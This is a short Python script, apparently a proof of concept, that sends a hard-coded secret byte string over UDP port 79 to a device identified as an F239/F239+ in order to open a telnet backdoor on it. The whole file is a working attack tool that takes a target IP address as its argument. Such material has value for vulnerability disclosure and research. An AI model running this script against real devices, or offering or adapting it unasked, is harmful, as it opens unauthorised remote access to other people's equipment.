#!/usr/bin/python
#
# Sending secret password to F239/F239+ to open up telnet backdoor
#
import socket
import sys

if len(sys.argv) < 2 :
    print >>sys.stderr, 'Usage: ', sys.argv[0], 'IP-address [port]'
    exit(0)

server_ip = sys.argv[1]
server_port = 79
if len(sys.argv) > 2 :
    server_port = int(sys.argv[2])

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

server_address = (server_ip, server_port)
secret = "\x84\x37\x59"

print >>sys.stderr, 'Sending to ', server_ip, server_port
try:
    # Send data
    sent = sock.sendto(secret, server_address)

finally:
    sock.close()
